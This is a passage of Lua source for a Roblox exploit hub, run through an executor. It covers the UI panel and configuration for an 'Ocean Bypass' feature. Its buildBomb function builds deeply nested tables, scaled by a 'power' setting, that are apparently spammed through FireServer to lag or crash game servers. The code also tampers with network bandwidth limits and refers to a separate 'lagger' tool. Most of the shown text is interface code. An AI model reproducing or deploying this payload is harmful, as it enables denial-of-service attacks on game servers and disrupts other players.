    if espGui then espGui:Destroy(); espGui = nil end
end

local _obRunning, _obSpamThread, _obGui = false, nil, nil

function syncBypassTheme()
    local gui = _obGui
    if not (gui and gui.Parent) then return end
    local a = ACCENT_COLOR
    if not a then return end
    pcall(function()
        local main = gui:FindFirstChild("Main")
        if main then
            local st = main:FindFirstChildOfClass("UIStroke")
            if st and not _obRunning then st.Color = a end
        end
    end)
end

function stopOceanBypass()
    -- Stop spam first (same as original) — does NOT touch bomb mid-FireServer more than cancel
    _obRunning = false
    _obSession = (_obSession or 0) + 1
    if _obSpamThread then
        pcall(function() task.cancel(_obSpamThread) end)
        _obSpamThread = nil
    end
    pcall(function()
        local nc = game:GetService("NetworkClient")
        if nc and nc.SetOutgoingKBPSLimit then nc:SetOutgoingKBPSLimit(0) end
    end)
    -- Hide + bulk-clear FX layer only (no per-frame Destroy storm)
    pcall(function()
        if _obGui and _obGui.Parent then
            _obGui.Enabled = false
            local main = _obGui:FindFirstChild("Main")
            if main then
                main.Visible = false
                local lines = main:FindFirstChild("BypassLines")
                if lines then
                    lines.Visible = false
                    pcall(function() lines:ClearAllChildren() end)
                end
            end
        end
    end)
    pcall(function() task.wait() end)
    local guiRef = _obGui
    _obGui = nil
    local function wipe(root)
        if not root then return end
        local g = root:FindFirstChild("Heartless Bypass")
        if g then pcall(function() g:Destroy() end) end
    end
    pcall(function() wipe(game:GetService("CoreGui")) end)
    pcall(function() if gethui then wipe(gethui()) end end)
    pcall(function()
        local lp = game:GetService("Players").LocalPlayer
        if lp then wipe(lp:FindFirstChild("PlayerGui")) end
    end)
    pcall(function() if guiRef and guiRef.Parent then guiRef:Destroy() end end)
end

function getDefaultHubPosition()
    return UDim2.new(0.5, -210, 0.5, -290)
end
function getDefaultBypassPosition()
    return UDim2.new(0.5, 0, 0.5, 0)
end
function applyHubPosition()
    pcall(function()
        local m = _hubMainRef
        if not m or not m.Parent then return end
        if guiPositionsSaved then
            m.Position = UDim2.new(hubPosSX or 0.5, hubPosOX or -210, hubPosSY or 0.5, hubPosOY or -290)
        else
            m.Position = getDefaultHubPosition()
        end
    end)
end
function applyBypassPosition(mainFrame)
    pcall(function()
        local m = mainFrame
        if not m then
            local g = _obGui
            m = g and g:FindFirstChild("Main")
        end
        if not m or not m.Parent then return end
        if guiPositionsSaved then
            m.Position = UDim2.new(bypassPosSX or 0.5, bypassPosOX or 0, bypassPosSY or 0.5, bypassPosOY or 0)
        else
            m.Position = getDefaultBypassPosition()
        end
    end)
end
function saveGuiPositions()
    pcall(function()
        local m = _hubMainRef
        if m and m.Parent then
            hubPosSX = m.Position.X.Scale
            hubPosOX = m.Position.X.Offset
            hubPosSY = m.Position.Y.Scale
            hubPosOY = m.Position.Y.Offset
        end
        local g = _obGui
        local bm = g and g:FindFirstChild("Main")
        if bm and bm.Parent then
            bypassPosSX = bm.Position.X.Scale
            bypassPosOX = bm.Position.X.Offset
            bypassPosSY = bm.Position.Y.Scale
            bypassPosOY = bm.Position.Y.Offset
        end
        local lm = _olMainRef
        if not lm then
            local lg = _olGui
            lm = lg and (lg:FindFirstChild("MainFrame") or lg:FindFirstChild("Main"))
        end
        if lm and lm.Parent then
            laggerPosSX = lm.Position.X.Scale
            laggerPosOX = lm.Position.X.Offset
            laggerPosSY = lm.Position.Y.Scale
            laggerPosOY = lm.Position.Y.Offset
        end
        guiPositionsSaved = true
    end)
end
function applyLaggerPosition(mainFrame)
    pcall(function()
        local m = mainFrame or _olMainRef
        if not m then
            local lg = _olGui
            m = lg and (lg:FindFirstChild("MainFrame") or lg:FindFirstChild("Main"))
        end
        if not m or not m.Parent then return end
        if guiPositionsSaved then
            m.Position = UDim2.new(laggerPosSX or 0.12, laggerPosOX or 0, laggerPosSY or 0.55, laggerPosOY or 0)
        end
    end)
end
function resetGuiPositions()
    guiPositionsSaved = false
    hubPosSX, hubPosOX, hubPosSY, hubPosOY = 0.5, -210, 0.5, -290
    bypassPosSX, bypassPosOX, bypassPosSY, bypassPosOY = 0.5, 0, 0.5, 0
    laggerPosSX, laggerPosOX, laggerPosSY, laggerPosOY = 0.12, 0, 0.55, 0
    applyHubPosition()
    applyBypassPosition()
    applyLaggerPosition()
end

-- Exact Ocean Bypass (user standalone) integrated into hub toggle
-- UI restyled to match 7UP Bypass look (green / modern mobile panel)
function startOceanBypass()
    stopOceanBypass()
    task.spawn(function()
        repeat task.wait() until game:IsLoaded()

        local UserInputService = game:GetService("UserInputService")
        local HttpService      = game:GetService("HttpService")
        local CoreGui          = game:GetService("CoreGui")
        local TweenService     = game:GetService("TweenService")
        local NetworkClient    = game:GetService("NetworkClient")
        local Players          = game:GetService("Players")

        local function wipeRoot(root)
            if not root then return end
            local e = root:FindFirstChild("Heartless Bypass")
            if e then e:Destroy() end
        end
        pcall(function() wipeRoot(CoreGui) end)
        pcall(function() if gethui then wipeRoot(gethui()) end end)
        pcall(function()
            local lp = Players.LocalPlayer
            wipeRoot(lp and lp:FindFirstChild("PlayerGui"))
        end)

        local ConfigFile = "HeartlessBypassConfig.json"
        local Config = { Keybind = "V", PCPower = 97000, MobilePower = 72000, Mode = "Mobile" }
        local function SaveConfig()
            if writefile then pcall(function() writefile(ConfigFile, HttpService:JSONEncode(Config)) end) end
        end
        if isfile and isfile(ConfigFile) then
            local ok, data = pcall(function() return HttpService:JSONDecode(readfile(ConfigFile)) end)
            if ok and data then
                if type(data.Keybind) == "string" then Config.Keybind = data.Keybind end
                if type(data.PCPower) == "number" then Config.PCPower = math.clamp(data.PCPower, 10000, 150000) end
                if type(data.MobilePower) == "number" then Config.MobilePower = math.clamp(data.MobilePower, 10000, 100000) end
                if data.Mode == "PC" or data.Mode == "Mobile" then Config.Mode = data.Mode end
            end
        end

        local DEPTH = 296
        local function buildBomb(power)
            local maintable, spammedtable = {}, {}
            table.insert(spammedtable, {})
            local z = spammedtable[1]
            for i = 1, DEPTH do
                local nt = {}
                table.insert(z, nt)
                z = nt
            end
            local maxRep = math.floor(power / (DEPTH + 2))
            for i = 1, maxRep do table.insert(maintable, spammedtable) end
            return maintable
        end

        local ACC = ACCENT_COLOR or Color3.fromRGB(56, 140, 255)
        local function txtOn(a)
            a = a or ACC
            local lum = 0.299 * a.R + 0.587 * a.G + 0.114 * a.B
            return lum > 0.6 and Color3.fromRGB(12, 12, 16) or Color3.fromRGB(255, 255, 255)
        end
        local C = {
            void = Color3.fromRGB(6, 8, 14),
            shell = Color3.fromRGB(11, 13, 20),
            plate = Color3.fromRGB(17, 19, 28),
            inset = Color3.fromRGB(13, 15, 23),
            accent = ACC,
            text = Color3.fromRGB(238, 242, 252),
            soft = Color3.fromRGB(148, 156, 176),
            dim = Color3.fromRGB(88, 94, 112),
            line = Color3.fromRGB(34, 38, 52),
            live = Color3.fromRGB(45, 210, 130),
            warn = Color3.fromRGB(255, 196, 60),
        }
        local function corner(p, r)
            local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r or 12); c.Parent = p; return c
        end
        local function stroke(p, col, th, tr)
            local s = Instance.new("UIStroke")
            s.Color = col or C.line; s.Thickness = th or 1; s.Transparency = tr or 0.4
            s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; s.Parent = p; return s
        end

        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "Heartless Bypass"
        ScreenGui.ResetOnSpawn = false
        ScreenGui.IgnoreGuiInset = true
        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        ScreenGui.DisplayOrder = 60
        parentGui(ScreenGui)
        _obGui = ScreenGui

        local PANEL_W, PANEL_H = 228, 360
        local sessionId = _obSession
        local localFxEnabled = (bypassFxEnabled ~= false)
        local localFxMode = (tostring(bypassFxMode or "normal"):lower() == "rainbow") and "rainbow" or "normal"
        local localFxStyle = tostring(bypassFxStyle or "node"):lower()
        if localFxStyle ~= "classic" and localFxStyle ~= "pulse" then localFxStyle = "node" end

        local function fxAlive()
            return sessionId == _obSession and _obGui ~= nil and _obGui.Parent ~= nil
        end
        local function fxHue(phase)
            if localFxMode == "rainbow" then
                return Color3.fromHSV((phase + tick() * 0.14) % 1, 0.88, 1)
            end
            return C.accent
        end

        local Main = Instance.new("Frame")
        Main.Name = "Main"
        Main.AnchorPoint = Vector2.new(0.5, 0.5)
        Main.Position = (guiPositionsSaved and UDim2.new(bypassPosSX or 0.5, bypassPosOX or 0, bypassPosSY or 0.5, bypassPosOY or 0)) or UDim2.new(0.5, 0, 0.5, 0)
        Main.Size = UDim2.fromOffset(PANEL_W, PANEL_H)
        Main.BackgroundColor3 = C.void
        Main.BorderSizePixel = 0
        Main.ClipsDescendants = true -- FX stays inside
        Main.Active = true
        Main.Parent = ScreenGui
        pcall(function() applyBypassPosition(Main) end)
        corner(Main, 22)
        local MainStroke = stroke(Main, C.accent, 1.6, 0.32)

        -- bg
        local bgImg = Instance.new("ImageLabel", Main)
        bgImg.Size = UDim2.fromScale(1, 1)
        bgImg.BackgroundTransparency = 1
        bgImg.ScaleType = Enum.ScaleType.Crop
        bgImg.ImageTransparency = 0.3
        bgImg.ZIndex = 0
        corner(bgImg, 22)
        do
            local id = tostring(customBgId or ""):gsub("%s+", ""):gsub("rbxassetid://", "")
            if id == "" then id = tostring(DEFAULT_BG_ID or THEME_BG_IMAGE_ID or "77425942502589"):gsub("rbxassetid://", "") end
            id = id:match("(%d+)") or "77425942502589"
            pcall(function()
                if themeBgFrame and themeBgFrame.Parent and themeBgFrame.Image ~= "" then
                    bgImg.Image = themeBgFrame.Image
                else
                    bgImg.Image = "rbxthumb://type=Asset&id=" .. id .. "&w=420&h=420"
                end
            end)
        end
        local veil = Instance.new("Frame", Main)
        veil.Size = UDim2.fromScale(1, 1)
        veil.BackgroundColor3 = C.void
        veil.BackgroundTransparency = 0.2
        veil.BorderSizePixel = 0
        veil.ZIndex = 1
        corner(veil, 22)

        -- FX layer STRICTLY clipped inside Main
        local fxLayer = Instance.new("Frame", Main)
        fxLayer.Name = "BypassLines"
        fxLayer.Size = UDim2.new(1, -8, 1, -8)
        fxLayer.Position = UDim2.fromOffset(4, 4)
        fxLayer.BackgroundTransparency = 1
        fxLayer.ClipsDescendants = true
        fxLayer.ZIndex = 2
        fxLayer.Visible = localFxEnabled
        corner(fxLayer, 18)

        -- style containers
        local styleNode = Instance.new("Frame", fxLayer)
        styleNode.Name = "StyleNode"
        styleNode.Size = UDim2.fromScale(1, 1)
        styleNode.BackgroundTransparency = 1
        styleNode.ClipsDescendants = true
        styleNode.ZIndex = 2

        local styleClassic = Instance.new("Frame", fxLayer)
        styleClassic.Name = "StyleClassic"
        styleClassic.Size = UDim2.fromScale(1, 1)
        styleClassic.BackgroundTransparency = 1
        styleClassic.ClipsDescendants = true
        styleClassic.ZIndex = 2

        local stylePulse = Instance.new("Frame", fxLayer)
        stylePulse.Name = "StylePulse"
        stylePulse.Size = UDim2.fromScale(1, 1)
        stylePulse.BackgroundTransparency = 1
        stylePulse.ClipsDescendants = true
        stylePulse.ZIndex = 2

        -- NODE: diagonal scans
        local scans = {}
        for i = 1, 5 do
            local rail = Instance.new("Frame", styleNode)
            rail.BorderSizePixel = 0
            rail.BackgroundColor3 = C.accent
            rail.BackgroundTransparency = 0.8
            rail.Size = UDim2.new(1.5, 0, 0, 1)
            rail.Rotation = -16
            rail.Position = UDim2.new(-0.25, 0, i / 6, 0)
            rail.ZIndex = 2
            table.insert(scans, { f = rail, speed = 0.01 + i * 0.003, phase = i * 0.35 })
        end

        -- CLASSIC: drifting lines (clipped)
        local driftLines = {}
        local function clearDrift()
            for i = #driftLines, 1, -1 do
                local L = driftLines[i]
                if L and L.frame then pcall(function() L.frame:Destroy() end) end
                table.remove(driftLines, i)
            end
            pcall(function() styleClassic:ClearAllChildren() end)
        end
        local function spawnDrift()
            if not fxAlive() or not localFxEnabled or localFxStyle ~= "classic" then return end
            if #driftLines >= 10 then return end
            local line = Instance.new("Frame")
            line.BorderSizePixel = 0
            local phase = math.random()
            line.BackgroundColor3 = fxHue(phase)
            local len = math.random(16, 70)
            local thick = math.random(1, 2)
            local h = styleClassic.AbsoluteSize.Y
            if h < 10 then h = PANEL_H end
            local y = math.random(4, math.max(8, h - 8))
            local fromLeft = math.random() > 0.5
            line.Size = UDim2.fromOffset(len, thick)
            line.Position = UDim2.fromOffset(fromLeft and -len - 4 or (PANEL_W + 4), y)
            line.BackgroundTransparency = math.random(45, 78) / 100
            line.ZIndex = 2
            if not pcall(function() line.Parent = styleClassic end) then
                pcall(function() line:Destroy() end)
                return
            end
            table.insert(driftLines, {
                frame = line, speed = (math.random(18, 42) / 100) * (fromLeft and 1 or -1),
                life = math.random(3, 8), age = 0, phase = phase,
            })
        end

        -- PULSE: vertical equalizer columns along bottom edge inside panel
        local pulseCols = {}
        for i = 1, 14 do
            local col = Instance.new("Frame", stylePulse)
            col.AnchorPoint = Vector2.new(0.5, 1)
            col.Position = UDim2.new(i / 15, 0, 1, -6)
            col.Size = UDim2.fromOffset(4, 10)
            col.BackgroundColor3 = C.accent
            col.BackgroundTransparency = 0.35
            col.BorderSizePixel = 0
            col.ZIndex = 2
            corner(col, 2)
            table.insert(pulseCols, col)
        end

        local function showStyle(style)
            styleNode.Visible = (style == "node")
            styleClassic.Visible = (style == "classic")
            stylePulse.Visible = (style == "pulse")
            if style ~= "classic" then clearDrift() end
        end
        showStyle(localFxStyle)

        task.spawn(function()
            while fxAlive() do
                local dt = task.wait(0.03)
                if not fxAlive() then break end
                if not localFxEnabled then
                    fxLayer.Visible = false
                else
                    fxLayer.Visible = true
                    showStyle(localFxStyle)
                    if localFxStyle == "node" then
                        for i, s in ipairs(scans) do
                            if s.f and s.f.Parent then
                                local y = (tick() * s.speed + s.phase) % 1.25 - 0.12
                                s.f.Position = UDim2.new(-0.25, 0, y, 0)
                                s.f.BackgroundColor3 = fxHue(i * 0.1)
                                s.f.BackgroundTransparency = 0.68 + 0.2 * math.sin(tick() * 2 + i)
                            end
                        end
                    elseif localFxStyle == "classic" then
                        for i = #driftLines, 1, -1 do
                            local L = driftLines[i]
                            local fr = L and L.frame
                            if not fr or not fr.Parent then
                                table.remove(driftLines, i)
                            else
                                L.age = L.age + dt
                                local pos = fr.Position
                                local nx = pos.X.Offset + L.speed * 55 * dt
                                fr.Position = UDim2.fromOffset(nx, pos.Y.Offset)
                                fr.BackgroundColor3 = fxHue(L.phase or 0)
                                if L.age > L.life or nx < -160 or nx > PANEL_W + 160 then
                                    pcall(function() fr:Destroy() end)
                                    table.remove(driftLines, i)
                                end
                            end
                        end
                        while #driftLines < 10 and localFxEnabled and localFxStyle == "classic" and fxAlive() do
                            spawnDrift()
                        end
                    elseif localFxStyle == "pulse" then
                        local t0 = tick()
                        for i, col in ipairs(pulseCols) do
                            if col and col.Parent then
                                local h = 8 + math.abs(math.sin(t0 * 6 + i * 0.55)) * 28
                                    + math.abs(math.sin(t0 * 3.2 + i * 0.2)) * 12
                                col.Size = UDim2.fromOffset(4, h)
                                col.BackgroundColor3 = fxHue(i * 0.07)
                                col.BackgroundTransparency = 0.25 + 0.25 * (1 - math.abs(math.sin(t0 * 6 + i)))
                            end
                        end
                    end
                end
            end
            clearDrift()
        end)

        -- top accent ribbon
        local ribbon = Instance.new("Frame", Main)
        ribbon.Size = UDim2.new(1, 0, 0, 3)
        ribbon.BackgroundColor3 = C.accent
        ribbon.BorderSizePixel = 0
        ribbon.ZIndex = 9
        local ribG = Instance.new("UIGradient", ribbon)
        ribG.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255,255,255)),
            ColorSequenceKeypoint.new(0.5, C.accent),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255,255,255)),
        })
        task.spawn(function()
            while ribbon.Parent and fxAlive() do
                ribG.Offset = Vector2.new(math.sin(tick() * 1.1) * 0.45, 0)
                task.wait(0.04)
            end
        end)

        -- HEADER
        local Header = Instance.new("Frame", Main)
        Header.Size = UDim2.new(1, 0, 0, 44)
        Header.BackgroundTransparency = 1
        Header.ZIndex = 10

        local badge = Instance.new("Frame", Header)
        badge.Size = UDim2.fromOffset(28, 28)
        badge.Position = UDim2.fromOffset(14, 10)
        badge.BackgroundColor3 = C.plate
        badge.BorderSizePixel = 0
        badge.ZIndex = 11
        corner(badge, 9)
        stroke(badge, C.accent, 1.2, 0.28)
        local badgeTxt = Instance.new("TextLabel", badge)
        badgeTxt.BackgroundTransparency = 1
        badgeTxt.Size = UDim2.fromScale(1, 1)
        badgeTxt.Font = Enum.Font.GothamBlack
        badgeTxt.Text = "ON"
        badgeTxt.TextSize = 11
        badgeTxt.TextColor3 = C.accent
        badgeTxt.ZIndex = 12

        local title = Instance.new("TextLabel", Header)
        title.BackgroundTransparency = 1
        title.Position = UDim2.fromOffset(54, 10)
        title.Size = UDim2.fromOffset(160, 18)
        title.Font = Enum.Font.GothamBlack
        title.Text = "OCEAN NODE"
        title.TextSize = 13
        title.TextColor3 = C.text
        title.TextXAlignment = Enum.TextXAlignment.Left
        title.ZIndex = 11

        local sub = Instance.new("TextLabel", Header)
        sub.BackgroundTransparency = 1
        sub.Position = UDim2.fromOffset(54, 28)
        sub.Size = UDim2.fromOffset(160, 14)
        sub.Font = Enum.Font.GothamMedium
        sub.Text = "custom relay panel"
        sub.TextSize = 10
        sub.TextColor3 = C.dim
        sub.TextXAlignment = Enum.TextXAlignment.Left
        sub.ZIndex = 11

        local hideBtn = Instance.new("TextButton", Header)
        hideBtn.Size = UDim2.fromOffset(28, 28)
        hideBtn.Position = UDim2.new(1, -40, 0, 12)
        hideBtn.BackgroundColor3 = C.plate
        hideBtn.Text = "–"
        hideBtn.Font = Enum.Font.GothamBlack
        hideBtn.TextSize = 16
        hideBtn.TextColor3 = C.soft
        hideBtn.AutoButtonColor = false
        hideBtn.ZIndex = 12
        corner(hideBtn, 8)
        stroke(hideBtn, C.line, 1, 0.4)

        local Body = Instance.new("Frame", Main)
        Body.Position = UDim2.fromOffset(12, 56)
        Body.Size = UDim2.new(1, -20, 1, -58)
        Body.BackgroundTransparency = 1
        Body.ZIndex = 10
        Body.ClipsDescendants = true

        -- mode
        local modeStrip = Instance.new("Frame", Body)
        modeStrip.Size = UDim2.new(1, 0, 0, 30)
        modeStrip.BackgroundColor3 = C.inset
        modeStrip.BorderSizePixel = 0
        modeStrip.ZIndex = 10
        corner(modeStrip, 10)
        stroke(modeStrip, C.line, 1, 0.45)

        local PCBtn = Instance.new("TextButton", modeStrip)
        PCBtn.Size = UDim2.new(0.5, -4, 1, -6)
        PCBtn.Position = UDim2.fromOffset(3, 3)
        PCBtn.BackgroundColor3 = C.plate
        PCBtn.BorderSizePixel = 0
        PCBtn.Font = Enum.Font.GothamBold
        PCBtn.Text = "DESKTOP"
        PCBtn.TextSize = 11
        PCBtn.TextColor3 = C.soft
        PCBtn.AutoButtonColor = false
        PCBtn.ZIndex = 11
        corner(PCBtn, 8)

        local MobileBtn = Instance.new("TextButton", modeStrip)
        MobileBtn.Size = UDim2.new(0.5, -4, 1, -6)
        MobileBtn.Position = UDim2.new(0.5, 1, 0, 3)
        MobileBtn.BackgroundColor3 = C.plate
        MobileBtn.BorderSizePixel = 0
        MobileBtn.Font = Enum.Font.GothamBold
        MobileBtn.Text = "MOBILE"
        MobileBtn.TextSize = 11
        MobileBtn.TextColor3 = C.soft
        MobileBtn.AutoButtonColor = false
        MobileBtn.ZIndex = 11
        corner(MobileBtn, 8)

        local StatusLbl = Instance.new("TextLabel", Body)
        StatusLbl.BackgroundTransparency = 1
        StatusLbl.Position = UDim2.fromOffset(0, 36)
        StatusLbl.Size = UDim2.new(1, 0, 0, 14)
        StatusLbl.Font = Enum.Font.GothamBold
        StatusLbl.Text = "RELAY  ·  STANDBY"
        StatusLbl.TextSize = 10
        StatusLbl.TextColor3 = C.dim
        StatusLbl.ZIndex = 10

        -- power core
        local core = Instance.new("Frame", Body)
        core.Position = UDim2.fromOffset(0, 54)
        core.Size = UDim2.new(1, 0, 0, 64)
        core.BackgroundColor3 = C.shell
        core.BorderSizePixel = 0
        core.ZIndex = 10
        core.ClipsDescendants = true
        corner(core, 14)
        local coreStroke = stroke(core, C.accent, 1.1, 0.5)

        local ringHold = Instance.new("Frame", core)
        ringHold.Size = UDim2.fromScale(1, 1)
        ringHold.BackgroundTransparency = 1
        ringHold.ClipsDescendants = true
        ringHold.ZIndex = 10
        ringHold.Visible = localFxEnabled
        local rings = {}
        for i = 1, 3 do
            local r = Instance.new("Frame", ringHold)
            r.AnchorPoint = Vector2.new(0.5, 0.5)
            r.Position = UDim2.fromScale(0.5, 0.5)
            r.Size = UDim2.fromOffset(30 + i * 22, 30 + i * 22)
            r.BackgroundTransparency = 1
            r.ZIndex = 10
            corner(r, 99)
            local rs = stroke(r, C.accent, 1, 0.55)
            table.insert(rings, { f = r, s = rs, i = i })
        end
        task.spawn(function()
            while fxAlive() do
                task.wait(0.04)
                if localFxEnabled and ringHold.Parent and (localFxStyle == "node" or localFxStyle == "pulse") then
                    ringHold.Visible = true
                    local pulse = 0.5 + 0.5 * math.sin(tick() * 5.2)
                    for _, r in ipairs(rings) do
                        local base = 28 + r.i * 20
                        local sz = base + pulse * (3 + r.i * 2)
                        r.f.Size = UDim2.fromOffset(sz, sz)
                        r.s.Color = fxHue(r.i * 0.15)
                        r.s.Transparency = 0.5 + (1 - pulse) * 0.3
                    end
                    coreStroke.Color = fxHue(0.05)
                    coreStroke.Transparency = 0.3 + (1 - pulse) * 0.35
                else
                    if ringHold.Parent then ringHold.Visible = false end
                    coreStroke.Color = C.line
                    coreStroke.Transparency = 0.45
                end
            end
        end)

        local PowerDisplay = Instance.new("TextLabel", core)
        PowerDisplay.Size = UDim2.new(1, -12, 0, 40)
        PowerDisplay.Position = UDim2.fromOffset(6, 10)
        PowerDisplay.BackgroundTransparency = 1
        PowerDisplay.Font = Enum.Font.GothamBlack
        PowerDisplay.Text = "72K"
        PowerDisplay.TextSize = 26
        PowerDisplay.TextColor3 = C.text
        PowerDisplay.ZIndex = 14

        local powerHint = Instance.new("TextLabel", core)
        powerHint.Size = UDim2.new(1, -12, 0, 14)
        powerHint.Position = UDim2.fromOffset(6, 50)
        powerHint.BackgroundTransparency = 1
        powerHint.Font = Enum.Font.GothamMedium
        powerHint.Text = "tap power to edit"
        powerHint.TextSize = 10
        powerHint.TextColor3 = C.dim
        powerHint.ZIndex = 14

        local PowerInput = Instance.new("TextBox", core)
        PowerInput.Size = UDim2.new(1, -12, 0, 40)
        PowerInput.Position = UDim2.fromOffset(6, 10)
        PowerInput.BackgroundTransparency = 1
        PowerInput.Font = Enum.Font.GothamBlack
        PowerInput.Text = ""
        PowerInput.TextSize = 26
        PowerInput.TextColor3 = C.text
        PowerInput.TextTransparency = 1
        PowerInput.ClearTextOnFocus = false
        PowerInput.ZIndex = 15

        local pwrRow = Instance.new("Frame", Body)
        pwrRow.Position = UDim2.fromOffset(0, 140)
        pwrRow.Size = UDim2.new(1, 0, 0, 28)
        pwrRow.BackgroundTransparency = 1
        pwrRow.ZIndex = 10
        local function makeStep(text, xScale)
            local b = Instance.new("TextButton", pwrRow)
            b.Size = UDim2.new(0.25, -3, 1, 0)
            b.Position = UDim2.new(xScale, 1, 0, 0)
            b.BackgroundColor3 = C.plate
            b.Font = Enum.Font.GothamBold
            b.Text = text
            b.TextSize = 11
            b.TextColor3 = C.soft
            b.AutoButtonColor = false
            b.ZIndex = 11
            corner(b, 8)
            stroke(b, C.line, 1, 0.45)
            return b
        end
        local MinusBig = makeStep("−10K", 0)
        local MinusSm = makeStep("−1K", 0.25)
        local PlusSm = makeStep("+1K", 0.5)
        local PlusBig = makeStep("+10K", 0.75)

        local KeybindBtn = Instance.new("TextButton", Body)
        KeybindBtn.Position = UDim2.fromOffset(0, 176)
        KeybindBtn.Size = UDim2.new(1, 0, 0, 28)
        KeybindBtn.BackgroundColor3 = C.inset
        KeybindBtn.Font = Enum.Font.GothamBold
        KeybindBtn.Text = "BIND  ·  V"
        KeybindBtn.TextSize = 11
        KeybindBtn.TextColor3 = C.soft
        KeybindBtn.AutoButtonColor = false
        KeybindBtn.ZIndex = 11
        corner(KeybindBtn, 9)
        local KeybindStroke = stroke(KeybindBtn, C.line, 1, 0.4)

        -- FX STYLE picker (above FX on/color)
        local styleLbl = Instance.new("TextLabel", Body)
        styleLbl.BackgroundTransparency = 1
        styleLbl.Position = UDim2.fromOffset(0, 212)
        styleLbl.Size = UDim2.new(1, 0, 0, 12)
        styleLbl.Font = Enum.Font.GothamBold
        styleLbl.Text = "FX STYLE"
        styleLbl.TextSize = 10
        styleLbl.TextColor3 = C.dim
        styleLbl.TextXAlignment = Enum.TextXAlignment.Left
        styleLbl.ZIndex = 11

        local StyleRow = Instance.new("Frame", Body)
        StyleRow.Position = UDim2.fromOffset(0, 226)
        StyleRow.Size = UDim2.new(1, 0, 0, 28)
        StyleRow.BackgroundTransparency = 1
        StyleRow.ZIndex = 12

        local function makeStyleBtn(name, label, xScale)
            local b = Instance.new("TextButton", StyleRow)
            b.Size = UDim2.new(0.333, -3, 1, 0)
            b.Position = UDim2.new(xScale, 1, 0, 0)
            b.BackgroundColor3 = C.plate
            b.Font = Enum.Font.GothamBold
            b.Text = label
            b.TextSize = 10
            b.TextColor3 = C.dim
            b.AutoButtonColor = false
            b.ZIndex = 13
            corner(b, 8)
            return b
        end
        local StyleNodeBtn = makeStyleBtn("node", "NODE", 0)
        local StyleClassicBtn = makeStyleBtn("classic", "CLASSIC", 0.333)
        local StylePulseBtn = makeStyleBtn("pulse", "PULSE", 0.666)

        -- FX color row
        local FxRow = Instance.new("Frame", Body)
        FxRow.AnchorPoint = Vector2.new(0, 1)
        FxRow.Position = UDim2.new(0, 0, 1, -46)
        FxRow.Size = UDim2.new(1, 0, 0, 28)
        FxRow.BackgroundTransparency = 1
        FxRow.ZIndex = 12

        local FxToggle = Instance.new("TextButton", FxRow)
        FxToggle.Size = UDim2.new(0.34, -3, 1, 0)
        FxToggle.BackgroundColor3 = localFxEnabled and C.accent or C.plate
        FxToggle.Font = Enum.Font.GothamBlack
        FxToggle.Text = localFxEnabled and "FX ON" or "FX OFF"
        FxToggle.TextSize = 10
        FxToggle.TextColor3 = localFxEnabled and txtOn(C.accent) or C.dim
        FxToggle.AutoButtonColor = false
        FxToggle.ZIndex = 13
        corner(FxToggle, 8)

        local NormFxBtn = Instance.new("TextButton", FxRow)
        NormFxBtn.Size = UDim2.new(0.33, -3, 1, 0)
        NormFxBtn.Position = UDim2.new(0.34, 2, 0, 0)
        NormFxBtn.BackgroundColor3 = (localFxMode == "normal") and C.accent or C.plate
        NormFxBtn.Font = Enum.Font.GothamBold
        NormFxBtn.Text = "SOLID"
        NormFxBtn.TextSize = 10
        NormFxBtn.TextColor3 = (localFxMode == "normal") and txtOn(C.accent) or C.dim
        NormFxBtn.AutoButtonColor = false
        NormFxBtn.ZIndex = 13
        corner(NormFxBtn, 8)

        local RainFxBtn = Instance.new("TextButton", FxRow)
        RainFxBtn.Size = UDim2.new(0.33, -3, 1, 0)
        RainFxBtn.Position = UDim2.new(0.67, 2, 0, 0)
        RainFxBtn.BackgroundColor3 = (localFxMode == "rainbow") and C.accent or C.plate
        RainFxBtn.Font = Enum.Font.GothamBold
        RainFxBtn.Text = "SPECTRUM"
        RainFxBtn.TextSize = 10
        RainFxBtn.TextColor3 = (localFxMode == "rainbow") and txtOn(C.accent) or C.dim
        RainFxBtn.AutoButtonColor = false
        RainFxBtn.ZIndex = 13
        corner(RainFxBtn, 8)

        local function paintStyleBtns()
            local map = {
                node = StyleNodeBtn,
                classic = StyleClassicBtn,
                pulse = StylePulseBtn,
            }
            for id, b in pairs(map) do
                local on = localFxStyle == id
                b.BackgroundColor3 = on and C.accent or C.plate
                b.TextColor3 = on and txtOn(C.accent) or C.dim
            end
        end
        local function paintFxBtns()
            FxToggle.BackgroundColor3 = localFxEnabled and C.accent or C.plate
            FxToggle.Text = localFxEnabled and "FX ON" or "FX OFF"
            FxToggle.TextColor3 = localFxEnabled and txtOn(C.accent) or C.dim
            NormFxBtn.BackgroundColor3 = (localFxMode == "normal") and C.accent or C.plate
            NormFxBtn.TextColor3 = (localFxMode == "normal") and txtOn(C.accent) or C.dim
            RainFxBtn.BackgroundColor3 = (localFxMode == "rainbow") and C.accent or C.plate
            RainFxBtn.TextColor3 = (localFxMode == "rainbow") and txtOn(C.accent) or C.dim
            paintStyleBtns()
            showStyle(localFxStyle)
            if ringHold then
                ringHold.Visible = localFxEnabled and (localFxStyle == "node" or localFxStyle == "pulse")
            end
            fxLayer.Visible = localFxEnabled
        end
        local function setStyle(id)
            localFxStyle = id
            bypassFxStyle = id
            paintFxBtns()
            pcall(function() if saveConfig then saveConfig() end end)
        end
        local function bindStyle(btn, id)
            local function go() setStyle(id) end
            btn.MouseButton1Click:Connect(go)
            pcall(function() btn.Activated:Connect(go) end)
        end
        bindStyle(StyleNodeBtn, "node")
        bindStyle(StyleClassicBtn, "classic")
        bindStyle(StylePulseBtn, "pulse")
        FxToggle.MouseButton1Click:Connect(function()
            localFxEnabled = not localFxEnabled
            bypassFxEnabled = localFxEnabled
            paintFxBtns()
            pcall(function() if saveConfig then saveConfig() end end)
        end)
        NormFxBtn.MouseButton1Click:Connect(function()
            localFxMode = "normal"; bypassFxMode = "normal"; paintFxBtns()
            pcall(function() if saveConfig then saveConfig() end end)
        end)
        RainFxBtn.MouseButton1Click:Connect(function()
            localFxMode = "rainbow"; bypassFxMode = "rainbow"; paintFxBtns()
            pcall(function() if saveConfig then saveConfig() end end)
        end)
        paintFxBtns()

        local ActivateBtn = Instance.new("TextButton", Body)
        ActivateBtn.AnchorPoint = Vector2.new(0, 1)
